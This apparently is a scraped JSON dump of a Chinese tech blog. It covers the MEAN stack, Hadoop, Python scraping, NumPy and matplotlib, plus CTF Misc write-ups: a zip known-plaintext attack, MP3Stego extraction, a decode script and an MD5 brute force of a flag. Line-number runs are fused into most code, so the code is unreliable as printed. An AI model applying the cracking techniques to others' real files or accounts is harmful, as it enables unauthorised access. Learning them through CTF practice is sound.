Web应用程序框架，构建单页和多页，和混合Web应用程序提供了一套强大的功能； (A)Aagular——JS的前端开发框架，提供了声明式的双向数据绑定；A (N)Node——跑在服务器的js，并发 异步 事件驱动，基于V8的运行时环境（JS语言开发），可以构建快速响应、可扩展的网络应用。n 1.架构框图采用MVC架构。模型-视图-控制器 (MVC) 可以直接存储JSON格式的mongoDB数据库， 1. 从 LAMP 到 MEANMEAN 不仅仅是一次首字母缩写的简单重新安排与技术升级。将基础平台从操作系统 (Linux) 转变为 JavaScript 运行时 (Node.js) 让操作系统变得独立：Node.js 在 Windows® 与 OS X 上的运行情况和在 Linux 上一样优秀。跨平台强。 - 1.1Node.js 同样取代了 LAMP 堆栈中的 Apache。但 Node.js 远远不止是一种简单的 Web 服务器。事实上，用户不会将完成后的应用程序部署到单机的 Web 服务器上；相反，Web 服务器已经包含在应用程序中，并已在 MEAN 堆栈中自动安装。结果，部署过程得到了极大简化，因为所需的 Web 服务器版本已经与余下的运行时依赖关系一起得到了明确定义。 - 1.2从传统数据库（如 MySQL）–&gt;非关系数据库 (如NoSQL）–&gt;无架构的、以文档为导向的持久存储（如 MongoDB），这些代表着持久化策略发生了根本性的转变。用户花费在编写 SQL 上的时间将会减少，将会有更多的时间编写 JavaScript 中的映射/化简功能。用户还能省掉大量的转换逻辑，因为 MongoDB 可以在本地运行 JavaScript Object Notation (JSON)。因此，编写 RESTful Web 服务变得前所未有的容易。 从 LAMP 到MEAN的最大转变在于从传统的服务器端页面生成变为客户端 单页面应用程序 (SPA)。借助 Express仍然可以处理服务器端的路由与页面生成，但目前的重点在客户端视图上，而 AngularJS 可以实","categories":[],"tags":[]},{"title":"实验吧Misc题目","slug":"实验吧Misc题目","date":"2016-10-05T15:53:56.000Z","updated":"2018-04-01T01:38:16.865Z","comments":true,"path":"2016/10/05/实验吧Misc题目/","link":"","permalink":"https://shackles.top/2016/10/05/实验吧Misc题目/","excerpt":"","text":"实验吧Misc题目 2016-10-08 1、 这就是一个坑QUESTION: 密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？ TIP: ARCHPR对flag.zip进行明文攻击,CRP相同。 ANSWER: 我们打开压缩包的tips.txt，里面提示：密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！这个tip告诉我们爆破是基本不可能了然后我们发现falg.zip里面也有个tips.txt，然后我猜想flag.zip里面的tips.txt和另外一个tips.txt是不是同一个文件然后把tips.txt压缩后可以发现，他们两个的crc32是一样的. 2、CheatEngineQUESTION: TIP: CE工具的使用，Cheat Engine 是一款内存修改编辑工具 ，它允许你修改你的游戏或软件内存数据，以得到一些其他功能。它包括16进制编辑，反汇编程序，内存查找工具。与同类修改工具相比，它具有强大的反汇编功能，且自身附带了外挂制作工具，可以用它直接生成外挂。 ANSWER:link 4、 图片里的动漫QUESTION: 一恒河沙中有三千世界，一张图里也可以有很多东西。答案是与一部动漫名字有关的小写英文字母。 TIP: 遇见此类型的题先binwak， 再 foremost； 文件隐藏，根据文件头判断。file命令; ANSWER: 6、CanonQUESTION: TIP: mp3文件和一个加密过的zip ，上MP3stego；MP3stego加密mp3，需要秘钥即为题目Cannon；得到base64，解密的CTF{}。 1Decode.exe -X -P Canon music.mp3 // 解密； ANSWER: 7、ROT-13变身了QUESTION: 提示：1、回旋13，回不回？ 2、有81,450,625种可能性 格式：flag{}破解下面的密文： 83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112 flag格式flag{} TIP: ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。先对每个数字减去13后，再chr（）转换成字符. ANSWER: 12345# rot13 -13 chr() 字符# -*- coding: utf-8 -*-lst=[83,89,78,84,45,86,96,45,115,121,110,116,136,132,132,132,108,128,117,118,134,110,123,111,110,127,108,112,124,122,108,118,128,108,131,114,127,134,108,116,124,124,113,108,76,76,76,76,138,23,90,81,66,71,64,69,114,65,112,64,66,63,69,61,70,114,62,66,61,62,69,67,70,63,61,110,110,112,64,68,62,70,61,112,111,112] lst=[chr(i-13) for i in lst] print &quot;&quot;.join(lst) 这样就会得到FLAG IS flag{www_shiyanbar_com_is_verygood????}MD5:38e4c352809e150186920aac37190cbc 123456789101112131415161718# -*- coding: utf-8 -*-#根据MD5爆破后四位import hashliba = &apos;38e4c352809e150186920aac37190cbc&apos;dic = r&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;for i1 in dic: for i2 in dic: for i3 in dic: for i4 in dic: md5 = hashlib.md5() b = &apos;flag&#123;www_shiyanbar_com_is_very_good_&apos; +i1+i2+i3+i4+&apos;&#125;&apos; md5.update(b) if md5.hexdigest() == a: print &apos;%s %s&apos; %(md5.hexdigest(),b) 得flag{www_shiyanbar_com_is_verygood@8Mu} 8、解码磁带QUESTION: http://ctf5.shiyanbar.com/misc/cidai.html TIP: ANSWER: 9、功夫秘籍QUESTION: TIP:.png文件，找到key is VF95c0s5XzVyaGtfX3VGTXR9M0Vse251QEUg base64：T_ysK9_5rhk__uFMt}3El{nu@E //base64 为36位，这是个坑。解出来加上空格。 栅栏：3位 Th3_kEyls{Kun9Fu_M@5tEr} ANSWER:Kun9Fu_M@5tEr 提交这个； ==10、WTF==QUESTION: http://ctf5.shiyanbar.com/423/misc/code.txt通过奇怪的字符串发现其中隐藏的信息 TIP: ANSWER: 12、==有趣的文件==QUESTION:这是一个有趣的文件，打开看看你能想到什么格式：CTF{ }解题链接： http://ctf5.shiyanbar.com/misc/funfileTIP: ANSWER:http://www.shiyanbar.com/ctf/writeup/513 QUESTION: TIP: ANSWER: 13、PaintQUESTION:matplotlib画图TIP: ANSWER:","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]},{"title":"大数据初探","slug":"大数据","date":"2016-10-05T15:53:56.000Z","updated":"2018-04-01T00:47:37.493Z","comments":true,"path":"2016/10/05/大数据/","link":"","permalink":"https://shackles.top/2016/10/05/大数据/","excerpt":"","text":"大数据初探FrontPage -Hadoop Wiki https://wiki.apache.org/hadoop/ Hadoop简介 | Hadoop Notebook https://pennywong.gitbooks.io/hadoop-notebook/content/introduction.html 细细品味Hadoop- 随笔分类 - 虾皮 - 博客园 http://www.cnblogs.com/xia520pi/category/346943.html HDFS 原理、架构与特性介绍 - OPEN 开发经验库 http://www.open-open.com/lib/view/open1376228205209.html free-programming-books/free-programming-books-zh.mdat master · vhf/free-programming-books https://github.com/vhf/free-programming-books/blob/master/free-programming-books-zh.md Hadoop家族学习路线图| 粉丝日志 http://blog.fens.me/hadoop-family-roadmap/ ApacheNutch™ - http://nutch.apache.org/ nutch 开源搜索引擎 http://wiki.jikexueyuan.com/project/hadoop/ 分布式：一个业务分拆多个子业务，部署在不同的服务器上 集群：同一个业务，部署在多个服务器上 集群是个物理形态，分布式是个工作方式。 《大型网站技术架构》网站的高性能架构及优化 - passionfly https://my.oschina.net/u/2260265/blog/501289 亿级PV超大型网站集群架构图形化深度揭秘讲解 - CSDN学院 - CSDN http://edu.csdn.net/course/detail/2278?ref=blog&amp;loc=0 负载均衡层次结构：LVS Nginx DNS CDN - 纸上得来终觉浅，绝知此事要躬行。 - 博客频道 - CSDN.NET http://blog.csdn.net/boonya/article/details/51064482 大型网站数据库架构演变 http://www.infoq.com/cn/presentations/large-website-databas-architecture-evolution 大数据 云计算 虚拟化 物联网 Apache 家族l Apache Hadoop：是Apache开源组织的一个分布式计算开源框架，提供了一个分布式文件系统子项目（HDFS）和支持MapReduce分布式计算的软件架构。 l Apache Hive：是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，通过类MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。 l Apache Pig：是一个基于Hadoop的大规模数据分析工具，它提供的SQL-LIKE语言叫Pig Latin，该语言的编译器会把类SQL的数据分析请求转换为一系列经过优化处理的MapReduce运算。 l Apache HBase：是一个高可靠性，高性能，面向列，可伸缩的分布式存储系统，利用HBase技术可以在廉价PC服务器上搭建起大规模结构化存储集群。 l Apache Sqoop：是一个用来将Hadoop和关系型数据库中的数据相互转移的工具，可以将一个关系型数据库（MySQL，Oracle，Postgres等）中的数据导入到Hadoop的HDFS中，也可以将HDFS的数据导入到关系型数据库中。 l Apache Zookeeper：是一个为分布式应用所设计的分布的，开源的协调服务，它主要是用于解决分布式应用中经常遇到的一些数据管理问题，简化分布式应用协调及其管理的难度，提供高性能的分布式服务 l Apache Mahout：是基于Hadoop的机器学习和数据挖掘的一个分布式框架.Mahout用MapReduce实现了部分数据挖掘算法，解决了并行挖掘的问题。 l Apache Cassandra：是一套开源分布式NoSQL数据库系统。它最初由Facebook开发，用于储存简单格式数据，集合Google BigTable的数据模型与Amazon Dynamo的完全分布式的架构于一身 l Apache Avro：是一个数据序列化系统，设计用于支持数据密集型，大批量数据交换的应用.Avro是新的数据序列化格式与传输工具，将逐步取代Hadoop原有的IPC机制 l Apache Ambari：是一种基于Web的工具，支持Hadoop集群的供应，管理和监控。 l Apache Chukwa：是一个开源的用于监控大型分布式系统的数据收集系统，它可以将各种各样类型的数据收集成适合Hadoop处理的文件保存在HDFS中供Hadoop进行各种MapReduce操作。 l Apache Hama：是一个基于HDFS的BSP（Bulk Synchronous Parallel）并行计算框架，Hama可用于包括图，矩阵和网络算法在内的大规模，大数据计算。 l Apache Flume：是一个分布的，可靠的，高可用的海量日志聚合的系统，可用于日志数据收集，日志数据处理，日志数据传输。 l Apache Giraph：是一个可伸缩的分布式迭代图处理系统，基于Hadoop平台，灵感来自BSP（批量同步并行）和Google的Pregel。 l Apache Oozie：是一个工作流引擎服务器，用于管理和协调运行在Hadoop平台上（HDFS，Pig和MapReduce）的任务。 l Apache Crunch：是基于Google的FlumeJava库编写的Java库，用于创建MapReduce程序。与Hive，Pig类似，Crunch提供了用于实现如连接数据，执行聚合和排序记录等常见任务的模式库 l Apache Whirr：是一套运行于云服务的类库（包括Hadoop），可提供高度的互补性.Whirr学支持Amazon EC2和Rackspace的服务。 l Apache Bigtop：是一个对Hadoop及其周边生态进行打包，分发和测试的工具。 l Apache HCatalog：是基于Hadoop的数据表和存储管理，实现中央的元数据和模式管理，跨越Hadoop和RDBMS，利用Pig和Hive提供关系视图。 l Cloudera Hue：是一个基于WEB的监控和管理系统，实现对HDFS，MapReduce / YARN，HBase，Hive，Pig的web化操作和管理。 Apache Hadoop​ Apache™Hadoop®项目开发用于可靠，可扩展，分布式计算的开源软件。 Apache Hadoop软件库是一个框架，允许使用简单的编程模型跨计算机集群分布式处理大型数据集。它的设计是从单个服务器扩展到数千个机器，每个都提供本地计算和存储。不是依靠硬件来提供高可用性，库本身设计用于检测和处理应用程序层的故障，因此在计算机集群之上提供高可用性服务，每个计算机都可能容易出现故障。 ​ 该项目包括以下模块： l Hadoop Common：支持其他Hadoop模块的常用实用程序。 l Hadoop**分布式文件系统**（HDFS™）：提供对应用程序数据的高吞吐量访问的分布式文件系统。 C盘 D盘 l Hadoop YARN：作业调度和集群资源管理的框架。 分布式资源管理 类似操作系统 l Hadoop MapReduce：一种基于YARN的大数据集并行处理系统。 visual studio 云计算是一种服务;虚拟化和分布式系统都是用来实现云计算的关键技术之一。 目前来讲虚拟化主要常用两个核心技术：服务器虚拟化，与应用虚拟化 目前来讲分布式系统主要用到的两个核心技术：分布式存储，与分布式计算 Apache的其他Hadoop相关项目包括：l Ambari™：用于配置，管理和监控Apache Hadoop集群的基于Web的工具，其中包括支持Hadoop HDFS，Hadoop MapReduce，Hive，HCatalog，HBase，ZooKeeper，Oozie，Pig和Sqoop。Ambari还提供了一个用于查看集群健康的仪表板，如热图，以及以视觉方式查看MapReduce，Pig和Hive应用程序的功能，以便以用户友好的方式诊断其性能特征。 l Avro™：数据串行化系统。 l Cassandra™：可扩展的多主数据库，无单点故障。 l Chukwa™：用于管理大型分布式系统的数据收集系统。 l HBase™：一个可扩展的分布式数据库，支持大型表的结构化数据存储。 l Hive™：提供数据摘要和即席查询的数据仓库基础设施。 数据仓库 l Mahout™：可扩展的机器学习和数据挖掘库。 l Pig™：用于并行计算的高级数据流语言和执行框架。 l Spark™：用于Hadoop数据的快速和通用的计算引擎。Spark提供了一个简单和表达性的编程模型，支持各种应用程序，包括ETL，机器学习，流处理和图形计算。 l Tez ™：一个基于Hadoop YARN的通用数据流编程框架，它提供了一个强大而灵活的引擎来执行任务的任意DAG，以便为批处理和交互式用例处理数据。Tez被Hive™，Pig™和Hadoop生态系统中的其他框架以及其他商业软件（如ETL工具）采用，以取代Hadoop™MapReduce作为底层执行引擎。 l ZooKeeper™：用于分布式应用程序的高性能协调服务。 HDFS 体系结构 HDFS 体系结构","categories":[],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://shackles.top/tags/大数据/"}]},{"title":"Python 爬虫","slug":"Python 爬虫","date":"2016-08-05T15:53:56.000Z","updated":"2018-03-31T15:17:22.021Z","comments":true,"path":"2016/08/05/Python 爬虫/","link":"","permalink":"https://shackles.top/2016/08/05/Python 爬虫/","excerpt":"","text":"Python 爬虫XPath （lxml 库）from lxml import etree selector=etree.HTML(源码) #将源码转化为能被XPath匹配的格式 selector.xpath(表达式) #返回为一列表1234567/ 从根节点选取。nodename 选取此节点的所有子节点。// 从当前节点 选择 所有匹配文档中的节点. 选取当前节点。.. 选取当前节点的父节点。@ 选取属性。//title[@*] 选取所有带有属性的 title 元素。 123456789101112131.contains ()： //div[contains(@id,&apos;in&apos;)] ,表示选择id中包含有’in’的div节点2.text()：由于一个节点的文本值不属于属性，比如“&lt;a class=”baidu“ href=”http://www.baidu.com“&gt;baidu&lt;/a&gt;”,所以，用text()函数来匹配节点：//a[text()=&apos;baidu&apos;]3.last()：前面已介绍4.starts-with()： //div[starts-with(@id,&apos;in&apos;)] ，表示选择以’in’开头的id属性的div节点5.not()函数，表示否定，//input[@name=‘identity’ and not(contains(@class,‘a’))] ，表示匹配出name为identity并且class的值中不包含a的input节点。 not()函数通常与返回值为true or false的函数组合起来用，比如contains(),starts-with()等，但有一种特别情况请注意一下：我们要匹配出input节点含有id属性的，写法如下：//input[@id]，如果我们要匹配出input节点不含用id属性的，则为：//input[not(@id)] author = article.xpath(&apos;div/p/a/text()&apos;).extract() 多选文本···html/body/div[2]/div[3]/div/div[4]/ul/li[@class=&quot;lip selected&quot;][0].get(&apos;href&apos;) 1234html = etree.HTML(resHtml)result = html.xpath(&apos;//tr[@class=&quot;odd&quot;] | //tr[@class=&quot;even&quot;]&apos;) scrapy：Python 爬虫框架1234567891 引擎打开一个域名，时蜘蛛处理这个域名，并让蜘蛛获取第一个爬取的URL。2 引擎从蜘蛛那获取第一个需要爬取的URL，然后作为请求在调度中进行调度。3 引擎从调度那获取接下来进行爬取的页面。4 调度将下一个爬取的URL返回给引擎，引擎将它们通过下载中间件发送到下载器。5 当网页被下载器下载完成以后，响应内容通过下载中间件被发送到引擎。6 引擎收到下载器的响应并将它通过蜘蛛中间件发送到蜘蛛进行处理。7 蜘蛛处理响应并返回爬取到的项目，然后给引擎发送新的请求。7 引擎将抓取到的项目项目管道，并向调度发送请求。8 系统重复第二部后面的操作，直到调度中没有请求，然后断开引擎与域之间的联系。 12345678sel = Selector(html_response)从HTML响应主体中提取所有的 元素，返回:class:Selector 对象(即 SelectorList 的一个对象)的列表:sel.xpath(&quot;//h1&quot;)从HTML响应主体上提取所有 元素的文字，返回一个unicode字符串的列表: sel.xpath(“//h1”).extract() # this includes the h1 tagsel.xpath(“//h1/text()”).extract() # this excludes the h1 tag12345在所有 &lt;p&gt; 标签上迭代，打印它们的类属性:for node in sel.xpath(&quot;//p&quot;): print node.xpath(&quot;@class&quot;).extract() response.xpath() response.css() 小Tip:\\n -&gt; ‘,\\n’: -&gt; ‘:’","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://shackles.top/tags/Python/"}]},{"title":"Python科学计算相关模块学习","slug":"Python科学计算相关模块学习","date":"2016-06-05T15:53:56.000Z","updated":"2018-04-01T01:35:13.295Z","comments":true,"path":"2016/06/05/Python科学计算相关模块学习/","link":"","permalink":"https://shackles.top/2016/06/05/Python科学计算相关模块学习/","excerpt":"","text":"Python科学计算相关模块学习numpyNumPy的主要对象是同种元素的多维数组。这是一个所有的元素都是一种类型、通过一个正整数元组索引的元素表格(通常是元素是数字)。在NumPy中维度(dimensions)叫做轴(axes)，轴的个数叫做秩(rank)。 NumPy的数组类被称作ndarrayN维数组 NumPy的数组类被称作ndarray。通常被称作数组。注意numpy.array和标准Python库类array.array并不相同，后者只处理一维数组和提供少量功能。更多重要ndarray对象属性有： ndarray.ndim 数组轴的个数，在python的世界中，轴的个数被称作秩 ndarray.shape 数组的维度。这是一个指示数组在每个维度上大小的整数元组。例如一个n排m列的矩阵，它的shape属性将是(2,3),这个元组的长度显然是秩，即维度或者ndim属性 ndarray.size 数组元素的总个数，等于shape属性中元组元素的乘积。 ndarray.dtype 一个用来描述数组中元素类型的对象，可以通过创造或指定dtype使用标准Python类型。另外NumPy提供它自己的数据类型。 ndarray.itemsize 数组中每个元素的字节大小。例如，一个元素类型为float64的数组itemsiz属性值为8(=64/8),又如，一个元素类型为complex32的数组item属性为4(=32/8). ndarray.data 包含实际数组元素的缓冲区，通常我们不需要使用这个属性，因为我们总是通过索引来使用数组中的元素。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Memory layout以下属性包含有关数组的内存布局的信息：ndarray--&gt;N-dimensional array ndarray.flags 有关数组的内存布局的信息。ndarray.shape 数组维数组。ndarray.strides 遍历数组时，在每个维度中步进的字节数组。ndarray.ndim 数组维数。ndarray.data Python缓冲区对象指向数组的数据的开始。ndarray.size 数组中的元素数。ndarray.itemsize 一个数组元素的长度（以字节为单位）。ndarray.nbytes 数组的元素消耗的总字节数。ndarray.base 如果内存是来自某个其他对象的基本对象。Item selection and manipulation对于采用轴关键字的数组方法，默认为None。如果axis None，则数组被视为1-D数组。axis的任何其他值表示操作应沿其进行的维度。ndarray.take（indices [，axis，out，mode]） 返回由给定索引处的a元素组成的数组。ndarray.put（indices，values [，mode]） 对于所有n，设置a.flat [n] = 在指数。ndarray.repeat（repeat[，axis]） 重复数组的元素。ndarray.choose（choices [，out，mode]） 使用索引数组从一组选择中构造新的数组。ndarray.sort（[axis，kind，order]） 就地对数组进行排序。ndarray.argsort（[axis，kind，order]） 返回将此数组排序的索引。ndarray.partition（kth [，axis，kind，order]） 重新排列数组中的元素，使得第k个位置的元素的值在排序数组中的位置。ndarray.argpartition（kth [，axis，kind，order]） 返回将对此数组进行分区的索引。ndarray.searchsorted（v [，side，sorter]） 查找索引，其中v的元素应插入到a以维持顺序。ndarray.nonzero() 返回非零元素的索引。ndarray.compress（condition [，axis，out]） 沿给定轴返回此数组的所选切片。ndarray.diagonal（[offset，axis1，axis2]） 返回指定的对角线。ndarray.argmax（[axis，out]） 沿给定轴的最大值的返回指数。ndarray.min（[axis，out，keepdims]） 沿给定轴返回最小值。ndarray.argmin（[axis，out]） 沿着a的给定轴的最小值的返回指数。ndarray.ptp（[axis，out]） 沿给定轴的峰到峰（最大 - 最小）值。ndarray.clip（[min，max，out]） 返回值限于[min， max]的数组。ndarray.conj() 复共轭所有元素。ndarray.round（[decimals，out]） 返回a，每个元素四舍五入为给定的小数位数。ndarray.trace（[offset，axis1，axis2，dtype，out]） 沿数组的对角线返回总和。ndarray.sum（[axis，dtype，out，keepdims]） 返回给定轴上的数组元素的总和。ndarray.cumsum（[axis，dtype，out]） 返回沿给定轴的元素的累积和。ndarray.mean（[axis，dtype，out，keepdims]） 返回沿给定轴的数组元素的平均值。ndarray.var（[axis，dtype，out，ddof，keepdims]） 沿给定轴返回数组元素的方差。ndarray.std（[axis，dtype，out，ddof，keepdims]） 返回给定轴上的数组元素的标准偏差。ndarray.prod（[axis，dtype，out，keepdims]） 返回给定轴上的数组元素的乘积ndarray.cumprod（[axis，dtype，out]） 返回沿给定轴的元素的累积乘积。ndarray.all（[axis，out，keepdims]） 如果所有元素均为True，则返回True。ndarray.any（[axis，out，keepdims]） 如果a的任何元素求值为True，则返回True。 函数和方法(method)总览 这是个NumPy函数和方法分类排列目录。这些名字链接到NumPy示例,你可以看到这些函数起作用. 创建数组 arange, array, copy, empty, empty_like, eye, fromfile, fromfunction, identity, linspace, logspace, mgrid, ogrid, ones, ones_like, r , zeros, zeros_like 转化 astype, atleast 1d, atleast 2d, atleast 3d, mat 操作 array split, column stack, concatenate, diagonal, dsplit, dstack, hsplit, hstack, item, newaxis, ravel, repeat, reshape, resize, squeeze, swapaxes, take, transpose, vsplit, vstack 询问 all, any, nonzero, where 排序 argmax, argmin, argsort, max, min, ptp, searchsorted, sort 运算 choose, compress, cumprod, cumsum, inner, fill, imag, prod, put, putmask, real, sum 基本统计 cov, mean, std, var 基本线性代数 cross, dot, outer, svd, vdot tile函数 : 进行重复def tile(A, reps) Inferred type: (A: Union[ndarray, Iterable], reps: Union[ndarray, Iterable]) -&gt; ndarray matplotlib2D图表Matplotlib中最基础的模块是pyplot。先从最简单的点图和线图开始，12345678910111213141516171819202122232425262728293031323334353637383940414243import numpy as npimport matplotlib as mplimport matplotlib.pyplot as plt# 通过rcParams设置全局横纵轴字体大小mpl.rcParams[&apos;xtick.labelsize&apos;] = 24mpl.rcParams[&apos;ytick.labelsize&apos;] = 24np.random.seed(42)# x轴的采样点x = np.linspace(0, 5, 100)# 通过下面曲线加上噪声生成数据，所以拟合模型就用y了……y = 2*np.sin(x) + 0.3*x**2y_data = y + np.random.normal(scale=0.3, size=100)# figure()指定图表名称plt.figure(&apos;data&apos;)# &apos;.&apos;标明画散点图，每个散点的形状是个圆plt.plot(x, y_data, &apos;.&apos;)# 画模型的图，plot函数默认画连线图plt.figure(&apos;model&apos;)plt.plot(x, y)# 两个图画一起plt.figure(&apos;data &amp; model&apos;)# 通过&apos;k&apos;指定线的颜色，lw指定线的宽度# 第三个参数除了颜色也可以指定线形，比如&apos;r--&apos;表示红色虚线# 更多属性可以参考官网：http://matplotlib.org/api/pyplot_api.htmlplt.plot(x, y, &apos;k&apos;, lw=3)# scatter可以更容易地生成散点图plt.scatter(x, y_data)# 将当前figure的图保存到文件result.pngplt.savefig(&apos;result.png&apos;)# 一定要加上这句才能让画好的图显示在屏幕上plt.show() 柱状或饼状类型的图点和线图表只是最基本的用法，有的时候我们获取了分组数据要做对比，柱状或饼状类型的图或许更合适： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import numpy as npimport matplotlib as mplimport matplotlib.pyplot as pltmpl.rcParams[&apos;axes.titlesize&apos;] = 20mpl.rcParams[&apos;xtick.labelsize&apos;] = 16mpl.rcParams[&apos;ytick.labelsize&apos;] = 16mpl.rcParams[&apos;axes.labelsize&apos;] = 16mpl.rcParams[&apos;xtick.major.size&apos;] = 0mpl.rcParams[&apos;ytick.major.size&apos;] = 0# 包含了狗，猫和猎豹的最高奔跑速度，还有对应的可视化颜色speed_map = &#123; &apos;dog&apos;: (48, &apos;#7199cf&apos;), &apos;cat&apos;: (45, &apos;#4fc4aa&apos;), &apos;cheetah&apos;: (120, &apos;#e1a7a2&apos;)&#125;# 整体图的标题fig = plt.figure(&apos;Bar chart &amp; Pie chart&apos;)# 在整张图上加入一个子图，121的意思是在一个1行2列的子图中的第一张ax = fig.add_subplot(121)ax.set_title(&apos;Running speed - bar chart&apos;)# 生成x轴每个元素的位置xticks = np.arange(3)# 定义柱状图每个柱的宽度bar_width = 0.5# 动物名称animals = speed_map.keys()# 奔跑速度speeds = [x[0] for x in speed_map.values()]# 对应颜色colors = [x[1] for x in speed_map.values()]# 画柱状图，横轴是动物标签的位置，纵轴是速度，定义柱的宽度，同时设置柱的边缘为透明bars = ax.bar(xticks, speeds, width=bar_width, edgecolor=&apos;none&apos;)# 设置y轴的标题ax.set_ylabel(&apos;Speed(km/h)&apos;)# x轴每个标签的具体位置，设置为每个柱的中央ax.set_xticks(xticks+bar_width/2)# 设置每个标签的名字ax.set_xticklabels(animals)# 设置x轴的范围ax.set_xlim([bar_width/2-0.5, 3-bar_width/2])# 设置y轴的范围ax.set_ylim([0, 125])# 给每个bar分配指定的颜色for bar, color in zip(bars, colors): bar.set_color(color)# 在122位置加入新的图ax = fig.add_subplot(122)ax.set_title(&apos;Running speed - pie chart&apos;)# 生成同时包含名称和速度的标签labels = [&apos;&#123;&#125;\\n&#123;&#125; km/h&apos;.format(animal, speed) for animal, speed in zip(animals, speeds)]# 画饼状图，并指定标签和对应颜色ax.pie(speeds, labels=labels, colors=colors)plt.show() 3D图表import matplotlib.pyplot as plt matrix plot lib plt.figure() 绘制多图，自定义画布大小 给图像标ID。 plt.subplot() ：设置画布划分以及图像在画布上输出的位置 plt.text()添加文字说明 text()可以在图中的任意位置添加文字，并支持LaTex语法 xlable(), ylable()用于添加x轴和y轴标签 title()用于添加图的题目 plt.annotate()文本注释 plt.xticks()/plt.yticks()设置轴记号 plt.legend()添加图例 plt.axes()","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://shackles.top/tags/Python/"}]},{"title":"Pyhon 模块","slug":"Pyhon 模块学习","date":"2016-05-05T15:53:56.000Z","updated":"2018-03-31T15:23:00.065Z","comments":true,"path":"2016/05/05/Pyhon 模块学习/","link":"","permalink":"https://shackles.top/2016/05/05/Pyhon 模块学习/","excerpt":"","text":"Pyhon 模块学习正则12345678910111213re.compile(pattern[, flags]) re.compile 函数 compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。 语法格式为：re.match(pattern, string, flags=0 # pattern 匹配的正则表达式re.search(pattern, string, flags=0)#re.search 扫描整个字符串并返回第一个成功的匹配。re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配 12345678910#!/usr/bin/pythonimport reline = &quot;Cats are smarter than dogs&quot;matchObj = re.match( r&apos;(.*) are (.*?) .*&apos;, line, re.M|re.I)if matchObj: print &quot;matchObj.group() : &quot;, matchObj.group() print &quot;matchObj.group(1) : &quot;, matchObj.group(1) print &quot;matchObj.group(2) : &quot;, matchObj.group(2)else: print &quot;No match!!&quot; http://www.runoob.com/python/python-reg-expressions.html 1. urllib urllib2123456789101112user_agent = &apos;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&apos;# 将user_agent写入头信息values = &#123;&apos;name&apos; : &apos;Michael Foord&apos;, &apos;location&apos; : &apos;Northampton&apos;, &apos;language&apos; : &apos;Python&apos; &#125;headers = &#123; &apos;User-Agent&apos; : user_agent &#125;data = urllib.urlencode(values)req = urllibs2.request(url,data=data,headers) response = urllib2.urlopen(req) the_page = response.read() 2.requests12345678910r = requests.post(&apos;https://api.github.com/some/endpoint&apos;, data=json.dumps(&#123;&apos;some&apos;: &apos;data&apos;&#125;))print r.json()print r.textprint r.json()print r.read()r.content()tag 基于gevent开发的requests库lxml12345678910lxml库,用C语言实现的，性能比BeauitfulSoup库快。lxml 库：xpath， BrautifulSoup 库 ： 遍历DOM；result[0].tag // 标签result[0].text // 文本内容result[0].tail // string对象，表示element闭合之后的尾迹。result[0].attrib // dictionary对象，表示附有的属性。strip() //python 函数去除字符 Element 为主要的类； from lxml import etree ​ 12345lxml.etree的方法：fromstring() // 用于解析字符串HTML() // 用于解析HTML对象XML() // 解析XML 对象parse() // 解析 文件呢类型的对象 12345from lxml import etreer = requests.post(url, params=params).textresponse = etree.HTML(r)result = response.xpath(&apos;//li/text()&apos;)print result 3.BeautifulSoup最主要的功能是从网页抓取数据。 123456Beautiful Soup 将复杂 HTML 文档转换成一个复杂的树形结构,每个节点都是 Python 对象,所有对象可以归纳为 4 种: Tag ：NavigableString ： BeautifulSoup ：Comment： http://beautifulsoup.readthedocs.io/zh_CN/latest/#id18 12345678再谈BeautifulSoup--------------------------------------------------------------------------------html = BeautifulSoup(html,&apos;lxml&apos;)html.select(&apos;选择器&apos;)html.find_all(&quot;tag&quot;, attrs=&#123;&quot;key&quot;: &quot;value&quot;&#125;).get_text().split(&apos;\\n&apos;) ##split()函数分割字符串为列表，然后通过list[n]选择。 123find()函数： tag,attribuutes (属性） 参数常用find(tag,attributes,resursive,text,limit,keywords)findAll(tag,attribuutes,recusive,text,keywords) json123load() json.loads() :json模块解码dump() json.dump() : json模块编码 过jshon的dumps的模块可以把特定的对象序列化处理为字符串 4. sys1234567args = sys.argvurl = &quot;&quot; ##命令行输入if len (args)==2: url = args [1] verify(url)else: print &quot;use :python %s url &quot; %(args[0]) hashlib 涉及安全散列和消息摘要 常用属性 hashlib.algorithms列出所有加密算法 h.digest_size产生的散列字节大小。 h.block_size哈希内部块的大小 常用方法 hash.new([arg])创建指定加密模式的hash对象 hash.update(arg)更新哈希对象以字符串参数。如果同一个hash对象重复调用该方法，m.update(a); m.update(b) 等价于 m.update(a+b) hash.digest()返回摘要，作为二进制数据字符串值。 hash.hexdigest()返回摘要，作为十六进制数据字符串值 hash.copy()复制 1234567import hashlibmd5 = hashlib.md5() md5.update(&quot;I am Sin_Geek&quot;) print md5.digest() print md5.hexdigest() print &apos;block_size:&apos;, md5.block_sizeprint &apos;digest_size:&apos;, md5.digest_size openpyxlb excel文档 操作https://www.cnblogs.com/anpengapple/p/6399304.html?utm_source=itdadao&amp;utm_medium=referral 12345678910from openpyxl 